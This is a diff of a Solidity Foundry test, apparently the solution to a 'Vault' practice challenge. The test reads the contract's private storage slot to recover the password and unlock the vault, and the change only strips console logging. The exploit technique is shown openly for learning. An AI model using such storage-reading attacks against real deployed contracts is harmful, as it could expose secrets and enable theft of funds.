@@ -19,12 +19,8 @@ contract AttackerVaultTest is Test {
         bytes32 pass = cheats.load(address(vault), bytes32(uint256(1)));
         emit log_bytes32(pass);
 
-        console.log("Vault status:", vault.locked());
         assertTrue(vault.locked());
-
         vault.unlock(pass);
-
         assertFalse(vault.locked());
-        console.log("Vault status:", vault.locked());
     }
 }
